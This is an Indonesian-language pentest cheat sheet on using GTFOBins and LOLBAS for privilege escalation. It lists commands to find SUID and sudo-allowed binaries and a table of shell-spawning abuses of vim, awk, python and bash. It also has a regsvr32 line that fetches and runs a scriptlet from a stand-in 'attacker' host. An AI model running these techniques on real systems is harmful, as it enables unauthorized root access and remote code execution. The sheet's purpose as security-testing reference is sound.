# 🐍 GTFOBins / LOLBAS — Menggunakan Binary Sistem untuk Privilege Escalation

> **Tujuan:** Mencari teknik abuse abuse‑dari binary Unix/Linux (GTFS bin) atau Windows (LOLBAS) yang memiliki SUID, setuid‑setgid, atau dapat dijalankan lewat sudo.

---

## 📌 Penjelasan Singkat

GTFOBins (Linux) dan LOLBAS (Windows) adalah **daftar online** yang mengumpulkan contoh abuse binary yang sudah ter‑install di sistem, menyediakan teknik eksekusi kode atau privilege escalation tanpa menambah binary eksternal.

---

## 🔎 Cara Menggunakan GTFOBins (Linux)

### 1️⃣ Temukan Binary SUID / Sudo‑able

```bash
# Cari semua binary dengan SUID bit
find / -perm -4000 -type f 2>/dev/null

# Lihat apa yang dapat dijalankan dengan sudo
sudo -l
```

### 2️⃣ Cari Di GTFOBins

Buka <https://gtfobins.github.io> dan masukkan nama binary (mis. `vim`, `awk`, `python`).

### 3️⃣ Contoh Abuse

| Binary | Teknik Abuse |
|--------|----------------|
| `vim`  | `vim -c ':!/bin/sh'` |
| `awk`  | `awk 'BEGIN{system("/bin/sh")}'` |
| `python` | `python -c 'import os; os.system("/bin/sh")'` |
| `bash` | `bash -p` |

---

## 🔎 Cara Menggunakan LOLBAS (Windows)

1. Buka <https://lolbas-project.github.io>.
2. Pilih binary (mis. `regsvr32.exe`, `rundll32.exe`).
3. Ikuti contoh abuse (mis. `regsvr32 /n /s /u /i:http://attacker/payload.sct scrobj.dll`).

---

## 📋 Checklist GTFOBins / LOLBAS

- [ ] Enumerasi binary SUID (`find / -perm -4000 -type f`).
- [ ] Enumerasi sudo‑allowed commands (`sudo -l`).
- [ ] Cari tiap binary di GTFOBins/LOLBAS.
- [ ] Pilih teknik abuse yang cocok dengan hak akses.
- [ ] Uji exploit pada lingkungan pengujian.
- [ ] Catat hasil dan mitigasi (remove SUID, restrict sudo).

---

## 📚 Referensi

- [GTFOBins – Linux Binary Exploitation](https://gtfobins.github.io)
- [LOLBAS – Windows Binary Abuse](https://lolbas-project.github.io)
- [OWASP – Privilege Escalation Cheat Sheet](https://owasp.org/www-project-privilege-escalation-cheat-sheet)
